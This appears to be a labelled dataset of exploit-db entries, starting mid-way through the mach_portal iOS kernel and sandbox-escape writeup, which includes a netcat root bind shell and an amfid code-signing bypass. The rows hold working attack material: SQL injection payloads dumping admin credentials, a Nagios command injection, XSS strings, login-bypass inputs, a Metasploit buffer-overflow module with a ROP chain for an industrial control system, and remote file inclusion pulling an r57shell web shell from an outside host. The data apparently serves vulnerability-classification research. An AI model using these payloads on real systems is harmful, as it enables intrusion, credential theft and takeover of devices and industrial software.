the code and make it better!)      it will fail more often if there is high system load - try leaving the device for a minute after rebooting it and connecting it to you mac before trying again   * connect to that port with netcat:      nc X.X.X.X 4141    where X.X.X.X is your iDevice’s ip address   * you have a root shell :) There’s no controlling terminal so fancy curses gui stuff won't work unless you fix that   * you can run any pseudo-signed thin ARM64 binaries - if you want the kernel task port it's host special port 4   * copy your custom testing tools to the iosbinpack64 directory and they'll be bundled with the .app so you can run them from the shell   * you're running as an unsandboxed root user so you can talk to any iokit user clients/mach services   * amfid is patched to allow any signatures/entitlements   * When you’re done hold power and home to reset the device  *** (2) Adding support for other devices ***  * you have to do this manually, sorry!   * download the ipsw for your device from https://www.theiphonewiki.com/wiki/Firmware    The bugs are there in any version <= 10.1.1 but the further back you go the more offsets    will be wrong so ideally stick to 10.1.1 (and for anything earlier that iOS 10 the kernel cache    is encrypted so you'll have to do the rest yourself)   * for >= iOS 10 unzip the ipsw and hexdump the kernel.release.* file like this:  $ hexdump -C kernelcache.release.n51 | head 00000000  30 83 b5 9b 0d 16 04 49  4d 34 50 16 04 6b 72 6e  |0......IM4P..krn| 00000010  6c 16 1c 4b 65 72 6e 65  6c 43 61 63 68 65 42 75  |l..KernelCacheBu| 00000020  69 6c 64 65 72 2d 31 31  36 32 2e 32 30 2e 31 04  |ilder-1162.20.1.| 00000030  83 b5 9a de 63 6f 6d 70  6c 7a 73 73 83 13 7d ae  |....complzss..}.| 00000040  01 64 80 00 00 b5 29 5e  00 00 00 01 00 00 00 00  |.d....)^........| 00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................| * 000001b0  00 00 00 00 ff cf fa ed  fe 0c 00 00 01 d5 00 f6  |................| 000001c0  f0 02 f6 f0 14 f6 f0 38  0e 9a f3 f1 20 f6 f1 00  |.......8.... ...| 000001d0  19 ff f1 f5 f0 5f 9f 5f  54 45 58 54 09 02 1c 03  |....._._TEXT....|   * note down the offset of the ff cf fa ed fe byte sequence (in this case it's 0x1b4)   * compile lzssdec from http://nah6.com/~itsme/cvs-xdadevtools/iphone/tools/lzssdec.cpp   * run a command like: lzssdec -o 0x1b4 < kernel.release.n51 > kernel.decompressed   * open the decompressed kernelcache in a recent version of IDA Pro (with support for iOS kextcaches)   * say yes when IDA asks to split by kext   * let the auto-analysis run - depending on how fast your computer is this might take a while! (it takes my 2013 MBP about 30 minutes)   * go view -> open subviews -> segments and find the __TEXT:HEADER segment, the start should be FFFFFFF007004000    if it isn't note this down as you'll need to work out a couple of offsets relative to this   * go view -> open subviews -> names and find the kernproc data symbol.   * subtract the __TEXT:HEADER value from that, this is the kernproc offset      eg for iPhone 5S 10.1.1 kernproc is at FFFFFFF0075AE0E0 making the offset: 0x5AA0E0   * now the harder one! We need to find allproc which isn't exported so is harder to find:   * go view -> open subviews -> strings and find the string ""pgrp_add : pgrp is dead adding process""   * hit 'x' on the autogenerated string symbol name; you should see this symbol referenced from two functions   * open the smaller of those functions in the IDA graph view   * this is pgrp_add in the XNU source   * scroll to the bottom of the CFG, the final three nodes all reference the same global variable with code like this:     ADRP  X8, #qword_FFFFFFF0075A8128@PAGE     LDR   X9, [X8,#qword_FFFFFFF0075A8128@PAGEOFF]   * that's the address of allproc - subtract the kernel base to get the offset, in this case it's: 0x5A4128   * open offset.c and add support for your device. You should only have to update those two variable (kernproc and allproc)    The structure offsets should stay the same, at least for recent kernels. If you want to target a much older kernel you'll    also have to work out all the structure offsets - this is much more fiddly.   * 32-bit devices:    All the offsets will be totally different and the code which manipulates the kernel data structures will also be completely wrong.    There's no reason it wouldn't work but you'll have to fix the code to make it work  *** fixing userspace stuff ***  I also rely on a handful of offsets in amfid; you should be able to find those very easily if they're different on your target. See the code and alse the section ""Patch amfid"" below.  *** (3) Notes on the bugs and exploits ***  This project is called ""mach_portal"" - it's the result of a research project I did this year looking at mach ports. (All the bugs used involve mach ports :-) ) There are two main bugs plus one more which is only used to force a service to restart:  CVE-2016-7637: Broken kernel mach port name uref handling on iOS/MacOS can lead to privileged port name replacement in other processes  CVE-2016-7644: XNU kernel UaF due to lack of locking in set_dp_control_port  CVE-2016-7661: MacOS/iOS arbitrary port replacement in powerd  There is no untether (persistent codesigning bypass) but the exploit will temporarily disable codesigning while it runs so you can run unsigned binaries.  The high level exploit flow is like this:  I use CVE-2016-7637 to replace launchd's send right to com.apple.iohideventsystem with a send right to a port for which I hold the receive right. I use CVE-2016-7661 to crash the powerd daemon (which runs as root). It gets automatically restarted and as part of its startup it will lookup the com.apple.iohideventsystem mach service and send its own task port to that service. Since I hold the receive right for that port this means that powerd actually sends me its task port giving me complete control over it :-) I use powerd's task port to get the host_priv port which I use to trigger the kernel bug.  The kernel bug is a lack of locking when releasing a reference on a port. I allocate a large number of mach ports then trigger the bug on around 20 of them which are likely to be allocated near each other in the kernel. I use no-more-senders notifications so I can deterministically know when I've managed to over-release a port so that I can actually give myself dangling port pointers at an exact point in time later.  I free all these mach ports (leaving myself with ~20 dangling mach port pointers) and force a zone GC. I try to move the page pointed to by all the dangling port pointers into the kalloc.4096 zone and then I send myself a large number of mach message containing OOL ports with send rights to the host port. I set up these OOL port pages so that overlapping the dangling port's context pointers there's a pointer to the host port ipc_port and the dangling port's lock and is_guarded fields are replaced with NULL pointers.  If that all worked I can call mach_port_get_context on each of the dangling ports and I should get back the address of the host port ipc_port.  The kernel task port is allocated at around the same time as the host port and as such they both end up in the same kernel zone page. I work out the base of this page then call mach_port_set_context on all of the dangling ports passing each possible address of the kernel task port in turn. I then receive all the ports I sent to myself and if everything worked I've ended receiving a send right to the kernel task port :)  Here's a more detailed writeup of the sandbox escape part of the exploit. You'll have to read the code for the kernel exploit, I haven't written a longer writeup for that yet.  *** Sandbox escape ***  When sending and receiving mach messages from userspace there are two important kernel objects; ipc_entry and ipc_object.  ipc_entry's are the per-process handles or names which a process uses to refer to a particular ipc_object.  ipc_object is the actual message queue (or kernel object) which the port refers to.  ipc_entrys have a pointer to the ipc_object they are a handle for along with the ie_bits field which contains the urefs and capacility bits for this name/handle (whether this is a send right, receive right etc.)    struct ipc_entry {     struct ipc_object *ie_object;     ipc_entry_bits_t ie_bits;     mach_port_index_t ie_index;     union {       mach_port_index_t next;   /* next in freelist, or...  */       ipc_table_index_t request;  /* dead name request notify */     } index;   };  #define IE_BITS_UREFS_MASK  0x0000ffff  /* 16 bits of user-reference */ #define IE_BITS_UREFS(bits) ((bits) & IE_BITS_UREFS_MASK)  The low 16 bits of the ie_bits field are the user-reference (uref) count for this name.  Each time a new right is received by a process, if it already had a name for that right the kernel will increment the urefs count. Userspace can also arbitrarily control this reference count via mach_port_mod_refs and mach_port_deallocate. When the reference count hits 0 the entry is free'd and the name can be re-used to name another right (this is actually only the case for send rights).  ipc_right_copyout is called when a right will be copied into a space (for example by sending a port right in a mach message to another process.) Here's the code to handle the sending of a send right:      case MACH_MSG_TYPE_PORT_SEND:         assert(port->ip_srights > 0);                  if (bits & MACH_PORT_TYPE_SEND) {             mach_port_urefs_t urefs = IE_BITS_UREFS(bits);                          assert(port->ip_srights > 1);             assert(urefs > 0);             assert(urefs < MACH_PORT_UREFS_MAX);                          if (urefs+1 == MACH_PORT_UREFS_MAX) {                 if (overflow) {                     /* leave urefs pegged to maximum */     <---- (1)                                          port->ip_srights--;                     ip_unlock(port);                     ip_release(port);                     return KERN_SUCCESS;                 }                                  ip_unlock(port);                 return KERN_UREFS_OVERFLOW;             }             port->ip_srights--;             ip_unlock(port);             ip_release(port);              ...                       entry->ie_bits = (bits | MACH_PORT_TYPE_SEND) + 1;  <---- (2)         ipc_entry_modified(space, name, entry);         break;   If copying this right into this space would cause that right's name's urefs count in that space to hit 0xffff then (if overflow is true) we reach the code at (1) which claims in the comment that it will leave urefs pegged at maximum. This branch doesn't increase the urefs but still returns KERN_SUCCESS. Almost all callers pass overflow=true.  The reason for this ""pegging"" was probably not to prevent the reference count from becoming incorrect but rather because at (2) if the urefs count wasn't capped the reference count would overflow the 16-bit bitfield into the capability bits.  The issue is that the urefs count isn't ""pegged"" at all. I would expect ""pegged"" to mean that the urefs count will now stay at 0xfffe and cannot be decremented - leaking the name and associated ipc_object but avoiding the possibilty of a name being over-released.  In fact all that the ""peg"" does is prevent the urefs count from exceeding 0xfffe; it doesn't prevent userspace from believing it has more urefs than that (by eg making the copyout's fail.)  What does this actually mean?  Let's consider the behaviour of mach_msg_server or dispatch_mig_server. They receive mach service messages in a loop and if the message they receieved didn't corrispond to the MIG schema they pass that received message to mach_msg_destroy. Here's the code where mach_msg_destroy destroys an ool_ports_descriptor_t:      case MACH_MSG_OOL_PORTS_DESCRIPTOR : {       mach_port_t                 *ports;       mach_msg_ool_ports_descriptor_t *dsc;       mach_msg_type_number_t      j;        /*        * Destroy port rights carried in the message         */       dsc = &saddr->ool_ports;       ports = (mach_port_t *) dsc->address;       for (j = 0; j < dsc->count; j++, ports++)  {           mach_msg_destroy_port(*ports, dsc->disposition); // calls mach_port_deallocate       }     ...  This will call mach_port_deallocate for each ool_port name received.  If we send such a service a mach message with eg 0x20000 copies of the same port right as ool ports the ipc_entry for that name will actually only have 0xfffe urefs. After 0xfffe calls to mach_port_deallocate the urefs will hit 0 and the kernel will free the ipc_entry and mark that name as free. From this point on the name can be re-used to name another right (for example by sending another message received on another thread) but the first thread will still call mach_port_deallocate 0x10002 times on that name.  This leads to something like a use-after-deallocate of the mach port name - strictly a userspace bug (there's no kernel memory corruption etc here) but caused by a kernel bug.  The challenge to exploiting this bug is getting the exact same port name reused in an interesting way.  This requires us to dig in a bit to exacly what a port name is, how they're allocated and under what circumstances they'll be reused.  Mach ports are stored in a flat array of ipc_entrys:    struct ipc_entry {     struct ipc_object *ie_object;     ipc_entry_bits_t ie_bits;     mach_port_index_t ie_index;     union {       mach_port_index_t next;   /* next in freelist, or...  */       ipc_table_index_t request;  /* dead name request notify */     } index;   };  mach port names are made up of two fields, the upper 24 bits are an index into the ipc_entrys table and the lower 8 bits are a generation number. Each time an entry in the ipc_entrys table is reused the generation number is incremented. There are 64 generations, so after an entry has been reallocated 64 times it will have the same generation number.  The generation number is checked in ipc_entry_lookup:    if (index <  space->is_table_size) {                 entry = &space->is_table[index];     if (IE_BITS_GEN(entry->ie_bits) != MACH_PORT_GEN(name) ||         IE_BITS_TYPE(entry->ie_bits) == MACH_PORT_TYPE_NONE)       entry = IE_NULL;       }  here entry is the ipc_entry struct in the kernel and name is the user-supplied mach port name.  Entry allocation: The ipc_entry table maintains a simple LIFO free list for entries; if this list is free the table will  be grown. The table is never shrunk.  Reliably looping mach port names: To exploit this bug we need a primitive that allows us to loop a mach port's generation number around.  After triggering the urefs bug to free the target mach port name in the target process we immediately send a message with N ool ports (with send rights) and no reply port. Since the target port was the most recently freed it will be at the head of the freelist and will be reused to name the first of the ool ports contained in the message (but with an incremented generation number.) Since this message is not expected by the service (in this case we send an invalid XPC request to launchd) it will get passed to mach_msg_destroy which will pass each of  the ports to mach_port_deallocate freeing them in the order in which they appear in the message. Since the freed port was reused to name the first ool port it will be the first to be freed. This will push the name N entries down the freelist.  We then send another 62 of these looper messages but with 2N ool ports. This has the effect of looping the generation number of the target port around while leaving it in approximately the middle of the freelist. The next time the target entry in the table is allocated it will have exactly the same mach port name as the original target right we triggered the urefs bug on.  For this iOS exploit I target the send right to com.apple.iohideventsystem which launchd has, and which I can lookup from inside the container sandbox  I look up the iohideventsystem service in launchd then use the urefs bug to free launchd's send right and use the looper messages to spin the generation number round. I then register a large number of dummy services with launchd so that one of them reuses the same mach port name as launchd thinks the iohideventsystem service has. (We can't register global mach services from inside the container sandbox but we can register App Group-restricted services, which work just the same for our purposes. This is why the exploit needs the App Groups capability.)  Now when any process looks up com.apple.iohideventsystem launchd will actually send them a send right to one of my dummy services :)  I add all those dummy services to a portset and use that recieve right and the legitimate iohideventsystem send right I still have to MITM all these new connections to iohideventsystem. As mentioned earlier clients of iohideventsystem send it their task ports, so all I have to do is crash a process which runs as root and is a client of iohideventsystem. When it restarts it will send it's task port to me :-)  *** Powerd crasher ***  To crash powerd I use CVE-2016-7661:  powerd checks in with launchd to get a server port and then wraps that in a CFPort:    pmServerMachPort = _SC_CFMachPortCreateWithPort(                           ""PowerManagement"",                           serverPort,                            mig_server_callback,                            &context);  It also asks to receive dead name notifications for other ports on that same server port:    mach_port_request_notification(               mach_task_self(),           // task               notify_port_in,                 // port that will die               MACH_NOTIFY_DEAD_NAME,      // msgid               1,                          // make-send count               CFMachPortGetPort(pmServerMachPort),        // notify port               MACH_MSG_TYPE_MAKE_SEND_ONCE,               // notifyPoly               &oldNotify);                                // previous  mig_server_callback is called off of the mach port run loop source to handle new messages on pmServerMachPort:    static void   mig_server_callback(CFMachPortRef port, void *msg, CFIndex size, void *info)   {       mig_reply_error_t * bufRequest = msg;       mig_reply_error_t * bufReply = CFAllocatorAllocate(           NULL, _powermanagement_subsystem.maxsize, 0);       mach_msg_return_t   mr;       int                 options;        __MACH_PORT_DEBUG(true, ""mig_server_callback"", serverPort);              /* we have a request message */       (void) pm_mig_demux(&bufRequest->Head, &bufReply->Head);  This passes the raw message to pm_mig_demux:    static boolean_t    pm_mig_demux(       mach_msg_header_t * request,       mach_msg_header_t * reply)   {       mach_dead_name_notification_t *deadRequest =                        (mach_dead_name_notification_t *)request;       boolean_t processed = FALSE;        processed = powermanagement_server(request, reply);        if (processed)            return true;              if (MACH_NOTIFY_DEAD_NAME == request->msgh_id)        {           __MACH_PORT_DEBUG(true, ""pm_mig_demux: Dead name port should have 1+ send right(s)"", deadRequest->not_port);            PMConnectionHandleDeadName(deadRequest->not_port);            __MACH_PORT_DEBUG(true, ""pm_mig_demux: Deallocating dead name port"", deadRequest->not_port);           mach_port_deallocate(mach_task_self(), deadRequest->not_port);                      reply->msgh_bits            = 0;           reply->msgh_remote_port     = MACH_PORT_NULL;            return TRUE;       }  This passes the message to the MIG-generated code for the powermanagement subsystem, if that fails (because the msgh_id doesn't match the subsystem for example) then this compares the message's msgh_id field to MACH_NOTIFY_DEAD_NAME.  deadRequest is the message cast to a mach_dead_name_notification_t which is defined like this in mach/notify.h:    typedef struct {       mach_msg_header_t   not_header;       NDR_record_t        NDR;       mach_port_name_t not_port;/* MACH_MSG_TYPE_PORT_NAME */       mach_msg_format_0_trailer_t trailer;   } mach_dead_name_notification_t;  This is a simple message, not a complex one. not_port is just a completely controlled integer which in this case will get passed directly to mach_port_deallocate.  The powerd code expects that only the kernel will send a MACH_NOTIFY_DEAD_NAME message but actually anyone can send this and force the privileged process to drop a reference on a controlled mach port name :)  Multiplexing these two things (notifications and a mach service) onto the same port isn't possible to do safely as the kernel doesn't prevent user->user spoofing of notification messages - usually this wouldn't be a problem as attackers shouldn't have access to the notification port.  You could probably do quite interesting things with this bug but in this case I just want to crash the service. I do that by spoofing no-more-senders notifications for powerd's task port. Once powerd's send right to its own task port has been freed pretty much everything breaks - in this case I send a copy_powersources_info message, the receving code doesn't check the return value of a call to mach_vm_allocate which fails because the task's task port is wrong and leads to the use of an uninitialized pointer.  *** Kernel Bug ****  See above for a short writeup of the kernel bug exploit. I will try to write a long-form writeup soon, but the code should be kind of clear.  *** Post-exploitation ****  I've taken a slightly different approach post-exploitation. Everything is data-only, I don't make any patches to r/o kernel memory. This means things should also work on the iPhone 7 but I don't have one to test :(  There are a number of downsides to taking this approach though:   * technically a lot of these things I do are racy, but in pratice it works perfectly well enough for a research platform   * some things become quite fiddly which are simple with a TEXT patch  This is also a research project for me; there are almost certainly far more downsides that I'm not aware of. iOS is complex, undocumented place and I don't really know what I'm doing!  The flow works like this:  Walk the process list and find the following tasks:  amfid  mach_portal  containermanagerd  launchd  Disable the sandbox:   sb_evaluate has a short-circuit success path if the process has the kern_cred credentials; neither the plaform policy nor   the process's sandbox profile will be evaluated. We can use the kernel memory access to give the mach_portal process the   kernel's credentials and we're no longer sandboxed.  Fix launchd:   The sandbox escape made a mess in launchd so I fix up launchd's send right to iohideventsystem to point back to the correct port.   I then restart powerd because otherwise we hit a watchdog timeout.  Patch amfid:   In order to run unsigned binaries and have somethign like a proper shell environment we need to convince amfid to allow binaries with invalid   signatures. Previous efforts in this area have replaced amfids import of MISValidateSignature to a function which would always return 0 (success)   but amfid now calls MISValidateSignatureAndCopyInfo which takes an out pointer to a CFDictionary which is expected to contain the correct CDHash   so just replacing the import won't work. I instead set myself as amfid's exception handler and point the MISValidateSignatureAndCopyInfo to an invalid   address. This means that amfid will crash whenever it validates a signature, and since we're the exception handler we get a message on the exception port   with the crashing thread state. I read the path to the file to be validated from amfid's address space, compute the CDHash SHA1 myself and write that into the   reply message which amfid will send back to the kernel then resume execution of amfid so it can send the reply.  Unsandbox containermangerd:   Since I haven't had time to investigate LvVM yet I don't remount the rootfs r/w which means that all the binaries we run are from the user partition. This means   that we can't prevent the kernel from requesting that containermanagerd allocate a container for them. I did test out doing a similar patch for containermanagerd   as I did for amfid which parsed the sb_packbuff requests from the kernel and fixed them up so that containermanagerd didn't get upset but it seemed easier to   just unsandbox it so it can make the directories it wants. This decision should be revisited, it's not ideal!  Make sure all child processes are also unsandboxed:   Since the sandbox defeat involves cheating by using the kern_cred we need a way to make sure all our child processes also have the kern_cred. This is kind of a hack   but it works fine for my purposes. You should really revisit this if you want to improve on this code!   I allocate a new mach port and set that as my bootstrap port and spin up a thread which mitm's between that port and a real send right to launchd. I request an audit   trailer with each message which allows me to get the sender of the message and thus be notified when a new child starts. I then use the kernel memory access to   find that pid's proc structure and give it and all its threads the kernel creds. A constructor in libxpc will make a synchronous request to the bootstrap   port during dyld initialization before any application code actually runs so this works well enough to allow all our children to run unsandboxed  Set kernel task port as host special port:   I also set the kernel task port as host special port 4 so you can easily get at it without having to rewrite the exploit code.  Shell:   I chmod everything in the iosbinpack64 directory to be executable then run bash on a bind shell on port 4141. This isn't ideal but is enough to run test tools   and explore the system, talk to all the userclients, devices, mach services, sysctls etc that you want to.   Proofs of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40931.zip",lack of locking in set_dp_control_port,1
32352,"AvailScript Job Portal Script - 'applynow.php' SQL Injection source: https://www.securityfocus.com/bid/31101/info  AvailScript Job Portal Script is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/job_seeker/applynow.php?jid=-99999+union+select+0,01,concat(username,0x3a,password),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+from+admin--",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
33051,"Nagios 3.0.6 - 'statuswml.cgi' Arbitrary Shell Command Injection source: https://www.securityfocus.com/bid/35464/info  Nagios is prone to a remote command-injection vulnerability because it fails to adequately sanitize user-supplied input data.  Remote attackers can exploit this issue to execute arbitrary shell commands with the privileges of the user running the application.  NOTE: For an exploit to succeed, access to the WAP interface's ping feature must be allowed.  Versions prior to Nagios 3.1.1 are vulnerable.   The following example URI is available:  https://www.example.com/nagios/cgi-bin/statuswml.cgi?ping=173.45.235.65%3Becho+%24PATH",fails to adequately sanitize user-supplied input data,1
34811,"Linea21 1.2.1 - 'search' Cross-Site Scripting source: https://www.securityfocus.com/bid/43711/info  Linea21 is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Linea21 1.2.1 is vulnerable; other versions may also be affected.   http://www.example.com/public/index.php?search=""&#039;><script>alert(&#039;xss&#039;)</script>&rub=resultats-recherche&valid.x=4&valid.y=6&valid=valider",fails to properly sanitize user-supplied input,1
36485,"FuseTalk Forums 3.2 - 'windowed' Cross-Site Scripting source: https://www.securityfocus.com/bid/51227/info  FuseTalk Forums is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker could leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This could allow the attacker to steal cookie-based authentication credentials and launch other attacks.  FuseTalk Forums 3.2 is vulnerable; other versions may also be affected.   http://www.example.com/login.cfm?windowed=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",fails to properly sanitize user-supplied input,1
18259,"Infoproject Business Hero - Multiple Vulnerabilities Infoproject Biznis Heroj (login.php) Authentication Bypass Vulnerability   Vendor: Infoproject DOO Product web page: http://www.biznisheroj.mk Affected version: Plus, Pro and Extra  Summary: Biznis Heroj or Business Hero (Áèçíèñ Õåðî¼) is the first software on the Macedonian market that will help you manage your business processes in your company, such as accounting, production, acquisition, archiving, inventory, and the Cloud. Using the Cloud technology, Biznis Heroj allows you to access the system from any computer at any time through any internet browser.  Desc: The vulnerability is caused due to an error in the logon authentication script (login.php) and can be exploited to bypass the login procedure by defining the 'username' and 'password' POST parameters with an SQL Injection attack, gaining admin privileges.  Tested on: Apache, PHP   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             liquidworm gmail com   Vendor status:  [14.12.2011] Vulnerability discovered. [15.12.2011] Contact with the vendor. [20.12.2011] No response from the vendor. [21.12.2011] Public security advisory released.   Advisory ID: ZSL-2011-5065 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5065.php   14.12.2011  ---   PoC:  https://[TARGET]/login.php  Username: ' or 1=1-- Password: ' or 1=1--   Infoproject Biznis Heroj (XSS/SQLi) Multiple Remote Vulnerabilities   Vendor: Infoproject DOO Product web page: http://www.biznisheroj.mk Affected version: Plus, Pro and Extra  Summary: Biznis Heroj or Business Hero (Áèçíèñ Õåðî¼) is the first software on the Macedonian market that will help you manage your business processes in your company, such as accounting, production, acquisition, archiving, inventory, and the Cloud. Using the Cloud technology, Biznis Heroj allows you to access the system from any computer at any time through any internet browser.  Desc: Input passed via the parameters 'filter' in 'widget.dokumenti_lista.php' and 'fin_nalog_id' in 'nalozi_naslov.php' script are not properly sanitised before being returned to the user or used in SQL queries. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code. The param 'config' in 'nalozi_naslov.php' and 'widget.dokumenti_lista.php' is vulnerable to a XSS issue where the attacker can execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: Apache, PHP   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             liquidworm gmail com   Vendor status:  [14.12.2011] Vulnerability discovered. [15.12.2011] Contact with the vendor. [20.12.2011] No response from the vendor. [21.12.2011] Public security advisory released.   Advisory ID: ZSL-2011-5064 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5064.php   14.12.2011  ---   XSS:  https://[TARGET]/prg_finansovo/nalozi_naslov.php?fin_nalog_id=140&config=alert(1); https://[TARGET]/widgets/widget.dokumenti_lista.php?config=alert(1);&bl=porackakupuvac&framenum=1   SQLi:  - POST https://[TARGET]/widgets/widget.dokumenti_lista.php  action=dok_naslov_lista_sindzir&config=porackakupuvac&grid_strana=celen& bl=porackakupuvac&magacin_id=1&magacin_config=1&magacin_celen_id=1&magacin_celen_config=1& magacin_izvoren_id=1&magacin_izvoren_config=1&dokument_tip_id=PORACKAKUPUVACML& dokument_tip_config=PORACKAKUPUVACML&dokument_tip_celen_id=PORACKAKUPUVACML& dokument_tip_celen_config=PORACKAKUPUVACML&dokument_tip_izvoren_id=PORACKAKUPUVACML& dokument_tip_izvoren_config=PORACKAKUPUVACML&dokument_tip_sleden_id=NALOGISPORAKA& order=dok_naslov.datum_dokument desc, dok_naslov.sifra desc & filter=dok_naslov.datum_dokument between '2011-11-15' and '2011-12-15'&offset=& limit=50&widget=1   - GET https://[TARGET]/prg_finansovo/nalozi_naslov.php?fin_nalog_id=140[SQLi]&config=default",an error in the logon authentication script (login.php),1
33331,"Yokogawa CS3000 - 'BKESimmgr.exe' Remote Buffer Overflow (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::Tcp    def initialize(info = {})     super(update_info(info,       'Name'           => 'Yokogawa CS3000 BKESimmgr.exe Buffer Overflow',       'Description'    => %q{         This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability         exists in the BKESimmgr.exe service when handling specially crafted packets, due to an         insecure usage of memcpy, using attacker controlled data as the size count. This module         has been tested successfully in Yokogawa CS3000 R3.08.50 over Windows XP SP3 and Windows         2003 SP2.       },       'Author'         =>         [           'juan vazquez',           'Redsadic <julian.vilas[at]gmail.com>'         ],       'References'     =>         [           ['CVE', '2014-0782'],           ['URL', 'https://community.rapid7.com/community/metasploit/blog/2014/05/09/r7-2013-192-disclosure-yokogawa-centum-cs-3000-vulnerabilities'],           ['URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf']         ],       'Payload'        =>         {           'Space'          => 340,           'DisableNops'    => true,           'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"" # Stack adjustment # add esp, -3500         },       'Platform'       => 'win',       'Targets'        =>         [           [             'Yokogawa Centum CS3000 R3.08.50 / Windows [ XP SP3 / 2003 SP2 ]',             {               'Ret'           => 0x61d1274f, # 0x61d1274f # ADD ESP,10 # RETN # libbkebatchepa.dll               'Offset'        => 64,               'FakeArgument1' => 0x0040E65C, # ptr to .data on BKESimmgr.exe               'FakeArgument2' => 0x0040EB90  # ptr to .data on BKESimmgr.exe             }           ],         ],       'DisclosureDate' => 'Mar 10 2014',       'DefaultTarget'  => 0))      register_options(       [         Opt::RPORT(34205)       ], self.class)   end    def check     data = create_pkt(rand_text_alpha(4))      res = send_pkt(data)      if res && res.length == 10       simmgr_res = parse_response(res)        if valid_response?(simmgr_res)         check_code = Exploit::CheckCode::Appears       else         check_code = Exploit::CheckCode::Safe       end     else       check_code = Exploit::CheckCode::Safe     end      check_code   end    def exploit     bof = rand_text(target['Offset'])     bof << [target.ret].pack(""V"")     bof << [target['FakeArgument1']].pack(""V"")     bof << [target['FakeArgument2']].pack(""V"")     bof << rand_text(16)  # padding (corrupted bytes)     bof << create_rop_chain     bof << payload.encoded      data = [0x1].pack(""N"")         # Sub-operation id, <= 0x8 in order to pass the check at sub_4090B0     data << [bof.length].pack(""n"")     data << bof      pkt = create_pkt(data)      print_status(""Trying target #{target.name}, sending #{pkt.length} bytes..."")     connect     sock.put(pkt)     disconnect   end    def create_rop_chain     # rop chain generated with mona.py - www.corelan.be     rop_gadgets =       [         0x004047ca, # POP ECX # RETN [BKESimmgr.exe]         0x610e3024, # ptr to &VirtualAlloc() [IAT libbkfmtvrecinfo.dll]         0x61232d60, # MOV EAX,DWORD PTR DS:[ECX] # RETN [LibBKESysVWinList.dll]         0x61d19e6a, # XCHG EAX,ESI # RETN [libbkebatchepa.dll]         0x619436d3, # POP EBP # RETN [libbkeeda.dll]         0x61615424, # & push esp #  ret  [libbkeldc.dll]         0x61e56c8e, # POP EBX # RETN [LibBKCCommon.dll]         0x00000001, # 0x00000001-> ebx         0x61910021, # POP EDX # ADD AL,0 # MOV EAX,6191002A # RETN [libbkeeda.dll]         0x00001000, # 0x00001000-> edx         0x0040765a, # POP ECX # RETN [BKESimmgr.exe]         0x00000040, # 0x00000040-> ecx         0x6191aaab, # POP EDI # RETN [libbkeeda.dll]         0x61e58e04, # RETN (ROP NOP) [LibBKCCommon.dll]         0x00405ffa, # POP EAX # RETN [BKESimmgr.exe]         0x90909090, # nop         0x619532eb  # PUSHAD # RETN [libbkeeda.dll]       ].pack(""V*"")      rop_gadgets   end    def create_pkt(data)     pkt = [0x01].pack(""N"")         # Operation Identifier     pkt << [data.length].pack(""n"") # length     pkt << data                    # Fake packet      pkt   end    def send_pkt(data)     connect     sock.put(data)     res = sock.get_once     disconnect      res   end    def parse_response(data)     data.unpack(""NnN"")   end    def valid_response?(data)     valid = false      if data && data[0] == 1 && data[1] == 4 && data[1] == 4 && data[2] == 5       valid = true     end      valid   end  end","an insecure usage of memcpy, using attacker controlled data as the size count",1
28045,dotWidget for articles 2.0 - '/admin/categories.php' Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/18479/info       dotWidget for Articles is prone to multiple remote file-include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.       An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.       Some of these issue may be related to those discussed in BID 18258 (DotWidget CMS Multiple Remote File Include Vulnerabilities).  http://www.example.com/path/admin/categories.php?admin_header_file=http://www.example2.com/r57shell.txt? http://www.example.com/path/admin/categories.php?admin_footer_file=http://www.example2.com/r57shell.txt?,a failure in the application to properly sanitize user-supplied input,1
27151,"Daffodil CRM 1.5 - 'Userlogin.asp' SQL Injection source: https://www.securityfocus.com/bid/16433/info  Daffodil CRM is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.   Version 8.0 and earlier are reported to be vulnerable; other versions may also be affected. Version 8.5 and later are reported to be invulnerable.   http://www.example.com:8080/daffodilcrm/userlogin.jsp  PoC could be: 1'or'1'='1",a failure in the application to properly sanitize user-supplied input before using it in an SQL query,1
